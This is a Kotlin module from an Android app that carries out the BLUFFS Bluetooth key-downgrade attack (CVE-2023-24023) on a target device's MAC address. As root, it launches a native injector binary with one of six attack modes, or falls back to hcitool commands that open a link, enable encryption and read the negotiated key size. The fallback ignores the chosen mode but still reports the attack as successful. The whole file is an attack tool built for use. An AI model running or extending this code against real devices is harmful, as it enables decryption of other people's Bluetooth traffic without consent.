package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Modes of operation for the BLUFFS attack (CVE-2023-24023).
 * Represents different strategies for forcing Key Derivation Function (KDF) weakness.
 */
enum class BluffsMode(val description: String) {
    A1("Force legacy SC (Secure Connections) mode"),
    A2("Manipulate Key Diversification"),
    A3("Downgrade LSC to unauthenticated pairing"),
    A4("Force short key via LMP negotiation"),
    A5("Inject renegotiation after encryption start"),
    A6("Force null LTK via cross-transport attack")
}

/**
 * Implementation of the BLUFFS (Bluetooth Forward and Future Secrecy) attack.
 *
 * This module targets the Session Key derivation mechanism in Bluetooth Classic (BR/EDR).
 * It attempts to force the target to negotiate a session key with low entropy,
 * allowing future decryption of traffic.
 *
 * The module first checks for a dedicated native binary (`bluffs_injector`).
 * If that binary is not present, it falls back to using hcitool to create an ACL
 * connection and check the negotiated encryption key size. A key size of 7 bytes
 * or fewer indicates the target is vulnerable to BLUFFS.
 *
 * Root is required for all approaches (LMP manipulation, hcitool access).
 * All privileged operations are executed through [RootExecutor].
 */
class BluffsModule {

    companion object {
        private const val TAG = "BluffsModule"
        private const val BLUFFS_BINARY_PATH = "/data/local/tmp/bluffs_injector"
        /** Key sizes at or below this threshold indicate vulnerability. */
        private const val VULNERABLE_KEY_SIZE_THRESHOLD = 7
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the BLUFFS attack workflow against the target device.
     *
     * The flow:
     * 1. Verify root access (required, no simulation fallback)
     * 2. Check if the native bluffs_injector binary exists
     * 3. If it exists, run it with the specified mode
     * 4. Otherwise, use hcitool to create an ACL connection and probe key size
     *
     * @param targetDevice The Bluetooth device to attack.
     * @param mode The specific BLUFFS variation to use.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice, mode: BluffsMode): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting BLUFFS attack (CVE-2023-24023) on ${targetDevice.name ?: mac} using mode $mode")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BLUFFS requires root for LMP manipulation or hcitool access. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $BLUFFS_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native bluffs_injector binary
            emit("Native bluffs_injector binary found at $BLUFFS_BINARY_PATH")
            emit("Executing: $BLUFFS_BINARY_PATH -t $mac -m ${mode.name}")

            val output = RootExecutor.execute("$BLUFFS_BINARY_PATH -t $mac -m ${mode.name}")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("bluffs_injector execution failed.")
            } else {
                emit("bluffs_injector execution completed.")
            }
        } else {
            // Fallback: use hcitool to probe the connection
            emit("Native binary not found at $BLUFFS_BINARY_PATH")
            emit("Falling back to hcitool-based key size probing...")

            executeHcitoolApproach(mac, mode)
        }
    }

    /**
     * Uses hcitool to create an ACL connection, attempt authentication and encryption,
     * and then check the negotiated key size. Emits results via the enclosing FlowCollector.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
        mac: String,
        mode: BluffsMode
    ) {
        // Step 1: Create ACL connection
        emit("Creating ACL connection to $mac...")
        val ccResult = RootExecutor.execute("hcitool cc $mac")
        if (ccResult.startsWith("Error")) {
            emit("Failed to create ACL connection: $ccResult")
            emit("The target may be out of range, unpaired, or not accepting connections.")
            return
        }
        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")

        // Step 2: Attempt authentication
        emit("Requesting authentication with $mac...")
        val authResult = RootExecutor.execute("hcitool auth $mac")
        if (authResult.startsWith("Error")) {
            emit("Authentication failed: $authResult")
            emit("Continuing to check encryption regardless...")
        } else {
            emit("Authentication result: ${authResult.ifBlank { "OK" }}")
        }

        // Step 3: Enable encryption
        emit("Enabling encryption on link to $mac...")
        val encResult = RootExecutor.execute("hcitool enc $mac enable")
        if (encResult.startsWith("Error")) {
            emit("Encryption setup failed: $encResult")
            emit("Cannot determine key size without encryption. Aborting.")
            return
        }
        emit("Encryption result: ${encResult.ifBlank { "OK" }}")

        // Step 4: Check negotiated key size
        emit("Checking negotiated encryption key size...")
        val keySizeResult = RootExecutor.execute("hcitool key_size $mac")

        if (keySizeResult.startsWith("Error")) {
            // hcitool may not support key_size subcommand on all versions
            emit("Could not query key size directly: $keySizeResult")
            emit("Trying btmgmt as alternative...")

            val btmgmtResult = RootExecutor.execute("btmgmt info")
            emit("btmgmt info: $btmgmtResult")
            emit("Manual key size analysis required. Check HCI event logs for LMP_encryption_key_size_req.")
        } else {
            emit("Key size result: $keySizeResult")

            // Parse the key size from the output
            val keySizeMatch = Regex("(\\d+)").find(keySizeResult)
            val keySize = keySizeMatch?.groupValues?.get(1)?.toIntOrNull()

            if (keySize != null) {
                emit("Negotiated key size: $keySize bytes")
                if (keySize <= VULNERABLE_KEY_SIZE_THRESHOLD) {
                    emit("VULNERABILITY CONFIRMED: Key size $keySize bytes <= $VULNERABLE_KEY_SIZE_THRESHOLD byte threshold.")
                    emit("The target accepted a weak session key. BLUFFS attack (mode $mode) succeeded.")
                    Log.w(TAG, "BLUFFS vulnerability confirmed on $mac: key size $keySize bytes")
                } else {
                    emit("Target enforced adequate key size ($keySize bytes > $VULNERABLE_KEY_SIZE_THRESHOLD).")
                    emit("BLUFFS attack (mode $mode) did not succeed. Target appears patched or enforces Secure Connections.")
                }
            } else {
                emit("Could not parse key size from output. Raw output: $keySizeResult")
            }
        }
    }
}
